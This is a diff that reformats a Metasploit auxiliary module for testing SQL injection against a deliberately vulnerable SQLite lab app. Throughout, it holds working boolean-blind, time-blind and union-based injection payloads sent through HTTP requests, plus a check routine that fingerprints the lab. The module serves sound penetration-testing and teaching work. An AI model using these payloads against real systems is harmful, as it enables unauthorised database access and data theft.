@@ -8,18 +8,16 @@ class MetasploitModule < Msf::Auxiliary
       update_info(
         info,
         'Name' => 'SQLite injection testing module',
-        'Description' => '
+        'Description' => %q{
           This module tests the SQL injection library against the  SQLite database management system
           The target : https://github.com/incredibleindishell/sqlite-lab
-        ',
-        'Author' =>
-          [
-            'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>'
-          ],
+        },
+        'Author' => [
+          'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>'
+        ],
         'License' => MSF_LICENSE,
         'Platform' => %w[linux],
-        'References' =>
-          [],
+        'References' => [],
         'Targets' => [['Wildcard Target', {}]],
         'DefaultTarget' => 0
       )
@@ -41,18 +39,18 @@ class MetasploitModule < Msf::Auxiliary
   def boolean_blind
     encoder = datastore['Encoder'].empty? ? nil : datastore['Encoder'].intern
     sqli = create_sqli(dbms: SQLitei::BooleanBasedBlind, opts: {
-                         encoder: encoder,
-                         hex_encode_strings: datastore['HexEncodeStrings'],
-                         safe: datastore['Safe']
-                       }) do |payload|
+      encoder: encoder,
+      hex_encode_strings: datastore['HexEncodeStrings'],
+      safe: datastore['Safe']
+    }) do |payload|
       res = send_request_cgi({
-                               'uri' => normalize_uri(target_uri.path, 'index.php'),
-                               'method' => 'POST',
-                               'vars_post' => {
-                                 'tag' => "' or #{payload}--",
-                                 'search' => 'Check Plan'
-                               }
-                             })
+        'uri' => normalize_uri(target_uri.path, 'index.php'),
+        'method' => 'POST',
+        'vars_post' => {
+          'tag' => "' or #{payload}--",
+          'search' => 'Check Plan'
+        }
+      })
       res.body.include?('Dear')
     end
     unless sqli.test_vulnerable
@@ -66,18 +64,18 @@ class MetasploitModule < Msf::Auxiliary
     encoder = datastore['Encoder'].empty? ? nil : datastore['Encoder'].intern
     truncation = datastore['TruncationLength'] <= 0 ? nil : datastore['TruncationLength']
     sqli = create_sqli(dbms: SQLitei::Common, opts: {
-                         encoder: encoder,
-                         hex_encode_strings: datastore['HexEncodeStrings'],
-                         truncation_length: truncation,
-                         safe: datastore['Safe']
-                       }) do |payload|
+      encoder: encoder,
+      hex_encode_strings: datastore['HexEncodeStrings'],
+      truncation_length: truncation,
+      safe: datastore['Safe']
+    }) do |payload|
       res = send_request_cgi({
-                               'uri' => normalize_uri(target_uri.path, 'index.php'),
-                               'method' => 'GET',
-                               'vars_get' => {
-                                 'tag' => "' and 1=2 union select 1,(#{payload}),3,4,5--"
-                               }
-                             })
+        'uri' => normalize_uri(target_uri.path, 'index.php'),
+        'method' => 'GET',
+        'vars_get' => {
+          'tag' => "' and 1=2 union select 1,(#{payload}),3,4,5--"
+        }
+      })
       if !res
         ''
       else
@@ -100,18 +98,18 @@ class MetasploitModule < Msf::Auxiliary
   def time_blind
     encoder = datastore['Encoder'].empty? ? nil : datastore['Encoder'].intern
     sqli = create_sqli(dbms: SQLitei::TimeBasedBlind, opts: {
-                         encoder: encoder,
-                         hex_encode_strings: datastore['HexEncodeStrings'],
-                         safe: datastore['Safe']
-                       }) do |payload|
+      encoder: encoder,
+      hex_encode_strings: datastore['HexEncodeStrings'],
+      safe: datastore['Safe']
+    }) do |payload|
       res = send_request_cgi({
-                               'uri' => normalize_uri(target_uri.path, 'index.php'),
-                               'method' => 'POST',
-                               'vars_post' => {
-                                 'tag' => "' or #{payload}--",
-                                 'search' => 'Check Plan'
-                               }
-                             })
+        'uri' => normalize_uri(target_uri.path, 'index.php'),
+        'method' => 'POST',
+        'vars_post' => {
+          'tag' => "' or #{payload}--",
+          'search' => 'Check Plan'
+        }
+      })
       raise ArgumentError unless res
     end
     unless sqli.test_vulnerable
@@ -141,9 +139,9 @@ class MetasploitModule < Msf::Auxiliary
 
   def check
     res = send_request_cgi({
-                             'uri' => normalize_uri(target_uri.path, 'index.php'),
-                             'method' => 'GET'
-                           })
+      'uri' => normalize_uri(target_uri.path, 'index.php'),
+      'method' => 'GET'
+    })
     if res&.body&.include?('--==[[IndiShell Lab]]==--')
       Exploit::CheckCode::Vulnerable
     else
